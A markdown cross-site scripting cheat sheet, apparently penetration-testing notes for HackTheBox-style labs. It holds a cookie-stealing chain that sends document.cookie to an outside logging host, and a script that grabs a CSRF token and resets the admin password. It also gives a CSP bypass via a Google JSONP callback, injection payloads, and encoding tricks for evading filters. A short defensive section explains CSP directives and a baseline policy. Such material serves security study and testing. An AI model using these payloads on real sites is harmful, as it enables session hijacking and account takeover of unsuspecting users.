# XSS

## XSS via window.location
1. Identify XSS vuln and paste such payload
```html
<script src="http://exploit.server/payload"></script>
```
2. In exploit server create such js-script
```javascript
window.location = "http://exfiltrate.htb/cookiestealer?c=" + document.cookie;
```
3. On `exfiltrate.htb` get cookies from logs.



## Reading CSRF token from response during XSS
```javascript
// GET CSRF token
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

// change PW
var csrf_req = new XMLHttpRequest();
var params = `username=admin&email=admin@vulnerablesite.htb&password=pwned&csrf_token=${csrftoken}`;
csrf_req.open('POST', '/home.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

## CSP
### common directives
- **style-src**: allowed origins for stylesheets
- **img-src**: allowed origins for images
- **object-src**: allowed origins for objects such as `<object>` or `<embed>`
- **connect-src**: allowed origins for HTTP requests from scripts. For instance, using XMLHttpRequest
- **default-src**: fallback value if a different directive is not explicitly set. For instance, if the img-src is not present in the CSP, the browser will use this value instead for images
- **frame-ancestors**: origins allowed to frame the page, for instance, in an `<iframe>`. This can be used to prevent Clickjacking attacks
- **form-action**: origins allowed for form submissions

### values for directives include
- **\***: All origins are allowed
- **'none'**: No origins are allowed
- **\*.benignsite.htb**: All subdomains of benignsite.htb are allowed
- **unsafe-inline**: Allow inline elements
- **unsafe-eval**: Allow dynamic code evaluation such as JavaScript's eval function
- **sha256-407e1bf4a1472948aa7b15cafa752fcf8e90710833da8a59dd8ef8e7fe56f22d**: Allow an element by hash
- **nonce-S0meR4nd0mN0nC3**: Allow an element by nonce

### A good baseline CSP
```http
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```
This CSP only allows the loading of images, stylesheets, and scripts from the same origin, only allows HTTP requests from JavaScript and form submissions to the same origin, only allows the same origin to frame the web page, and prevents any other resource from loading. The CSP needs to be adjusted accordingly if any external resources are used.

### Bypass CSP
```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
```

## XSS Payloads
Using pseudoprotocols `data` and `javascript`
```html
<object data="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<svg/onload=alert(1)>
<script/src="http://exploit.htb/exploit"></script>
```

## Advanced Bypasse
`alert(1)`
```js
# Unicode
"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"

# Octal Encoding
"\141\154\145\162\164\50\61\51"

# Hex Encoding
"\x61\x6c\x65\x72\x74\x28\x31\x29"

# Base64 Encoding
atob("YWxlcnQoMSk=")

# String.fromCharCode
String.fromCharCode(97,108,101,114,116,40,49,41)

# .source
/alert(1)/.source

# URL Encoding
decodeURI(/alert(%22xss%22)/.source)

eval("alert(1)")
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
[].constructor.constructor(alert(1))()

eval("\141\154\145\162\164\50\61\51")
setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))
Function(atob("YWxlcnQoMSk="))()
```

## Resources
- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
- https://html5sec.org/
- https://github.com/zigoo0/JSONBee


